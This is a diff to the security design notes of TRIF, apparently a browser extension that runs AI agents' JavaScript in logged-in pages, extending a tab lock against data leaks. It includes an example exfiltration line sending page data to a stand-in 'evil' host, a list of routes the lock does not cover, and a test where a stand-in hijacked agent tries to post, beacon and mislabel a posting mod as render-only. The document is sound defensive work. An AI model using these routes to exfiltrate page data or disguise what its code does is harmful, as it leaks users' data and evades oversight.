@@ -21,7 +21,10 @@ it can't change TRIF's own files (PROTOCOL.md "Run scope", "Agent sandboxes").
 `trif run` runs the agent's JavaScript in the page, logged in. Before a side-panel run's code runs in a
 tab, TRIF locks the tab (extension/tablock.js): declarativeNetRequest session rules, applied by the
 browser to that tab, block every request that changes something (POST, PUT, PATCH, DELETE: fetch, XHR,
-sendBeacon, form posts, of any kind) and every WebSocket. Page code can't get around a rule the browser
+sendBeacon, form posts, of any kind), every WebSocket, and anything that could carry what the page shows
+to another site whatever its method: going to another site's page (`location = "https://evil/?" +
+data`), a frame, fetch, XHR or event stream to one. The page's images, scripts, styles, fonts and media
+still load from wherever they do (X's come from twimg.com), so it keeps working. Page code can't get around a rule the browser
 applies; the agent's code, and anything it leaves behind (timers, wrapped functions), lives only as long
 as the page does. The lock lasts until the tab shows a new document: a reload or a real navigation.
 - It's the document that counts, not the URL (a single-page site changes the URL without a new
@@ -35,12 +38,16 @@ as the page does. The lock lasts until the tab shows a new document: a reload or
   per-tab condition, checked by reading the rules back), `trif run` fails and the code doesn't run.
 - Reading the page, clicks, key presses and the mod's own test events work as before: in 50 real runs,
   every input an agent sent was to drive its own mod, none needed to send a request.
-- The page's own requests in that document are blocked too (X's "Something went wrong"). The panel
-  says the tab is locked, with a Reload button.
+- The page's own requests in that document are blocked too (X's "Something went wrong"), and links to
+  other sites don't open from it. The panel says the tab is locked, with a button that reloads it (or,
+  when the tab was sent to a blocked page, takes it back to the page it was locked on).
 
-Not covered: GET requests (loading an image whose address carries data to another site; most sites'
-content security policies, X's among them, limit where a page can load from), and a service worker's
-requests. The terminal's `trif run` (the user's own agent, which already has their shell) doesn't lock.
+Not covered: an image, script, style, font or media load whose address carries data to another site
+(many sites' content security policies, X's among them, limit where those can come from; others don't),
+a service worker's requests, writes to the page's storage (localStorage, cookies, drafts) that the site
+reads after the reload, and the tab that opened the locked one when it kept a `window.opener` link. A page
+restored from the back/forward cache could run for a few milliseconds before it's locked again. The
+terminal's `trif run` (the user's own agent, which already has their shell) doesn't lock.
 
 ## Mods: held by what their code does (0.3)
 
@@ -88,7 +95,8 @@ prompt is the most trusted thing the agent reads.
 tests/powers.test.js (what the classifier must find, evasions included), tests/scope.test.js (holds,
 allowed lines, review), tests/tablock.test.js (the lock against a stand-in browser), and in real Chrome
 and Firefox, tests/e2e/scenario.js hijackedAgentCheck: a stand-in agent posts, beacons, opens a socket,
-puts a POST off until after its command, reads with a GET, and writes a mod whose header says render-only
-over code that posts. The test site must receive none of the writes; the GET works; the mod is held for
-its `fetch`, with "render-only" shown as the agent's claim; a reload unlocks the tab; the terminal's
-`trif run` doesn't lock it.
+puts a POST off until after its command, reads with a GET, fetches from another site, sends the tab to
+another site with "what it read", and writes a mod whose header says render-only over code that posts.
+Neither site may receive any of it; the GET works; the mod is held for its `fetch`, with "render-only"
+shown as the agent's claim; the panel's button brings the tab back, unlocked; the terminal's `trif run`
+doesn't lock it.
